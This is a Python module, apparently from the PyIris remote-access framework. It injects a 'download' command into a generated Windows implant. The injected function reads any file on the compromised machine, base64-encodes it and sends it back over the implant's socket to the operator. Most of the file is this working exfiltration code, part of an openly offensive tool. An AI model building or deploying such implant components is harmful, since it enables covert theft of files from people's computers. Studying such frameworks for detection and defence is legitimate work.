# GUI + CUI
# done
import library.modules.config as config

config.main()
interface = config.interface


def main(option):
    if option == 'generate':
        config.import_statements.append('from base64 import b64encode')
        config.functions.append('''
def download(data):
    filepath = data.split(' ',1)[1]
    with open(filepath,'rb') as f:
        file_data = f.read()
    send_all(s,filepath + ' ' + b64encode(file_data).decode())''')
        config.logics.append('''
            elif command == "download":
                download(data)''')
        config.help_menu['download <Remote file path>'] = 'Remotely download a file to local current working directory of PyIris'
    elif option == 'info':
        if interface == "GUI":
            return {
                "Name": "Download File component",
                "OS": "Windows",
                "Required Modules": "base64",
                "Commands": "download <Remote file path>",
                "Description": "Remotely download a file to local current working directory of PyIris, utilizes base64 to encode binary data"}
        elif interface == "CUI":
            print('\nName             : Download File component' \
                  '\nOS               : Windows' \
                  '\nRequired Modules : base64' \
                  '\nCommands         : download <Remote file path>' \
                  '\nDescription      : Remotely download a file to local current working directory of PyIris, utilizes base64 to encode binary data\n')
